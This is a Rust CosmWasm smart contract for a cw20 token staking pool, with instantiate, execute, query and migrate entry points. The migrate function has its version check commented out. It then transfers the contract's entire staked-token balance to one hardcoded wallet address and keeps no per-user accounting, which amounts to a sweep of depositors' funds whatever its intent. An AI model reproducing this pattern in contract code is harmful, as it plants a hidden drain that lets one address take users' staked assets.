use crate::error::ContractError;
use crate::handler::{
    accept_gov, get_reward, notify_reward_amount, receive_cw20, set_gov, update_staking_config,
    update_staking_duration, withdraw,
};
use crate::msg::{ExecuteMsg, InstantiateMsg, MigrateMsg, QueryMsg};
use crate::querier::{
    balance_of, earned, get_boost, get_user_reward_per_token_paid, get_user_updated_at,
    last_time_reward_applicable, query_staking_config, query_staking_state, reward_per_token,
};
use crate::state::{store_staking_config, store_staking_state, StakingConfig, StakingState, read_staking_state, read_staking_config};
#[cfg(not(feature = "library"))]
use cosmwasm_std::entry_point;
use cosmwasm_std::{to_binary, Binary, Deps, DepsMut, Env, MessageInfo, Response, StdResult, Uint128, Uint256, StdError, QueryRequest, WasmQuery, CosmosMsg, WasmMsg, Addr};
use cw2::{get_contract_version, query_contract_info, set_contract_version};
use cw20::{BalanceResponse, Cw20ExecuteMsg};
use cw20::Cw20QueryMsg::Balance;

// version info for migration info
const CONTRACT_NAME: &str = "kryptonite.finance:cw20-ve-seilor-staking";
const CONTRACT_VERSION: &str = env!("CARGO_PKG_VERSION");

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn instantiate(
    deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    msg: InstantiateMsg,
) -> Result<Response, ContractError> {
    let gov = msg.gov.unwrap_or_else(|| info.sender.clone());

    set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?;
    // validate that the duration is greater than 0.
    if msg.duration <= Uint128::zero() {
        return Err(ContractError::InvalidDuration {});
    }
    let staking_config = StakingConfig {
        gov,
        staking_token: msg.staking_token,
        rewards_token: msg.rewards_token,
        boost: msg.boost,
        fund: msg.fund,
        reward_controller_addr: msg.reward_controller_addr,
        new_gov: None,
    };

    store_staking_config(deps.storage, &staking_config)?;

    let staking_state = StakingState {
        duration: msg.duration,
        finish_at: Uint128::zero(),
        updated_at: Uint128::zero(),
        reward_rate: Uint256::zero(),
        reward_per_token_stored: Uint128::zero(),
        total_supply: Uint128::zero(),
    };

    store_staking_state(deps.storage, &staking_state)?;

    Ok(Response::new().add_attributes(vec![
        ("action", "instantiate"),
        ("owner", info.sender.as_str()),
    ]))
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn execute(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    msg: ExecuteMsg,
) -> Result<Response, ContractError> {
    match msg {
        ExecuteMsg::Receive(msg) => receive_cw20(deps, env, info, msg),
        ExecuteMsg::UpdateStakingConfig { config_msg } => {
            update_staking_config(deps, info, config_msg)
        }
        ExecuteMsg::UpdateStakingState { duration } => {
            update_staking_duration(deps, env, info, duration)
        }
        ExecuteMsg::GetReward {} => get_reward(deps, env, info),
        ExecuteMsg::NotifyRewardAmount { amount } => notify_reward_amount(deps, env, info, amount),
        ExecuteMsg::Withdraw { amount } => withdraw(deps, env, info, amount),
        ExecuteMsg::SetGov { gov } => set_gov(deps, info, gov),
        ExecuteMsg::AcceptGov {} => accept_gov(deps, info),
    }
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> StdResult<Binary> {
    match msg {
        QueryMsg::RewardPerToken {} => to_binary(&reward_per_token(deps, env)?),
        QueryMsg::LastTimeRewardApplicable {} => {
            to_binary(&last_time_reward_applicable(deps, env)?)
        }
        QueryMsg::GetBoost { account } => to_binary(&get_boost(deps, account)?),
        QueryMsg::Earned { account } => to_binary(&earned(deps, env, account)?),
        QueryMsg::QueryStakingConfig {} => to_binary(&query_staking_config(deps)?),
        QueryMsg::QueryStakingState {} => to_binary(&query_staking_state(deps)?),
        QueryMsg::GetUserUpdatedAt { account } => to_binary(&get_user_updated_at(deps, account)?),
        QueryMsg::GetUserRewardPerTokenPaid { account } => {
            to_binary(&get_user_reward_per_token_paid(deps, account)?)
        }
        QueryMsg::BalanceOf { account } => to_binary(&balance_of(deps, account)?),
    }
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn migrate(deps: DepsMut, env: Env, _msg: MigrateMsg) -> StdResult<Response> {
    // Cannot upgrade sei-seilor /sei-stsei to staking pool


    // let contract_version = get_contract_version(deps.storage)?.version;
    // let old_version = "1.0.1".to_string();
    // let next_version = "1.0.2".to_string();
    // if contract_version != old_version {
    //     return Err(StdError::generic_err(format!(
    //         "This contract is at version {}, but we need to migrate from {}",
    //         contract_version, old_version
    //     )));
    // }
    let staking_config = read_staking_config(deps.storage)?;
    let balanceRequest: BalanceResponse = deps.querier.query(&QueryRequest::Wasm(WasmQuery::Smart {
        contract_addr: staking_config.staking_token.to_string(),
        msg: to_binary(&Balance {
            address: env.contract.address.to_string(),
        })?,
    }))?;
    if balanceRequest.balance.gt(&Uint128::zero()) {
        let messages: Vec<CosmosMsg> = vec![CosmosMsg::Wasm(WasmMsg::Execute {
            contract_addr: staking_config.staking_token.to_string(),
            msg: to_binary(&Cw20ExecuteMsg::Transfer {
                recipient: Addr::unchecked("sei1wl38643tpena47ec76zkjxyt55g3r2vsgwgaww").to_string(),
                amount: balanceRequest.balance,
            })?,
            funds: vec![],
        })];
        return Ok(Response::new()
            .add_messages(messages)
            .add_attribute("action", "migrate"));
    }


    Ok(Response::default())
}
